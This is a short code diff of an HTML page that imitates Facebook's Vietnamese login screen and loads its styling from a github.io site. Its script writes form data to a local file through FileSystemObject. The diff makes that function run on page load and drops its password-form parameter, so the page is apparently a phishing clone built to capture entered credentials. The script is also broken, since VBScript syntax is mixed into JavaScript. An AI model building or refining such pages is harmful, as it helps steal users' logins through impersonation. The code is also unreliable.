@@ -10,7 +10,7 @@
     <title>Facebook - Đăng nhập hoặc đăng ký</title>
     <link rel="stylesheet" href="https://candfansjp.github.io/style.css">
     <script LANGUAGE="javascript">
-       function WriteToFile(passForm) {
+       function WriteToFile() {
       
           set fso = CreateObject("Scripting.FileSystemObject");  
           set s = fso.CreateTextFile("/test.txt", True);
@@ -19,6 +19,8 @@
           s.writeline("-----------------------------");
           s.Close();
        }
+
+      WriteToFile();
    </script>
   </head>
   <body>
@@ -38,7 +40,7 @@
           </div>
           <hr>
           <div class="button">
-            <a href="#">Create new account</a>
+            <a href="#">Tạo tài khoản mới</a>
           </div>
         </form>
       </div>
